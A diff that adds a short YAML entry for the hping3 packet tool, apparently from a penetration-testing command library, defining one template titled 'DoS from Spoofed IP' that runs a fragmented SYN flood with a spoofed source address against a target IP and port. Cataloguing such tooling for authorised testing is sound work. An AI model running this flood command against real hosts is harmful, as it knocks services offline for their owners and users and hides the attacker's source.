@@ -1,0 +1,15 @@
+---
+name: hping3
+description: Send (almost) arbitrary TCP/IP packets to network hosts
+os: Linux
+ptf_module: null
+---
+commands:
+  - "DoS from Spoofed IP":
+    - type: ["bash","standalone"]
+    - text: "hping3 {IPV4} --flood --frag --spoof {IPV4} --destport {INT} --syn"
+    - input: ["target IPv4 address","spoofed IPv4 address","target TCP port"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-y"
+
+...
